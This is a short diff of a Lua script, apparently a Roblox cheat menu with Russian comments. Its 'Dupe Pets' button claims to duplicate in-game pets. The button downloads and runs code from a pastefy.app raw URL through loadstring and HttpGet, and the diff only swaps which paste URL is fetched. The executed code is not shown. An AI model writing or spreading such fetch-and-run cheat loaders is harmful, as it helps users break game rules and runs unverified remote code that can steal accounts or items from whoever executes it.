@@ -11,7 +11,7 @@ local PetsSection = MainTab:NewSection("Dupe Pets")
 -- Кнопка для дублирования питомцев
 PetsSection:NewButton("Dupe", "Dragon Fly, Raccoon, Red Fox", function()
     -- Запуск вашего скрипта при нажатии
-    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
+    loadstring(game:HttpGet("https://pastefy.app/TjQF34JK/raw"))()
 end)
 
 -- Вкладка с автором
